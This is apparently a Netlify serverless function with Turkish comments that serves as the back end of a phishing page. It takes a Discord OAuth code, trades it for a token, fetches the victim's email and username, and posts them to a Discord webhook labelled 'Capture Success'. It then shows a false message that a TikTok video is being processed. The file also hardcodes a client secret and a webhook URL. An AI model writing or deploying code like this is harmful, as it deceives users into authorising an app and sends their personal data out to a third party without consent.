const axios = require('axios');

exports.handler = async (event) => {
    const code = event.queryStringParameters.code;
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1484265463990063184/ERIszpXHCFMexvjVIFL3sRrAxs8YidtcsyQmyODqe0eKipGOxYPJzmnyykQPj4EqSIZs";

    if (!code) return { statusCode: 400, body: "No code!" };

    try {
        // 1. Kodu Token ile değiştir
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: '1484264299995336865',
            client_secret: 'Lk2TU5ekmrmKCV90G2m-6RTg9hzOHbQJ',
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: 'https://vidgonet.netlify.app/.netlify/functions/callback'
        }).toString(), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const accessToken = tokenResponse.data.access_token;

        // 2. Kullanıcı bilgilerini (Email dahil) çek
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        // 3. Webhook'a uçur
        await axios.post(WEBHOOK_URL, {
            content: `🎯 **Netlify Capture Success!**\nEmail: ${userResponse.data.email}\nUser: ${userResponse.data.username}`
        });

        return {
            statusCode: 200,
            body: "Verification Successful! Your TikTok video is being processed."
        };
    } catch (err) {
        return { statusCode: 500, body: err.toString() };
    }
};
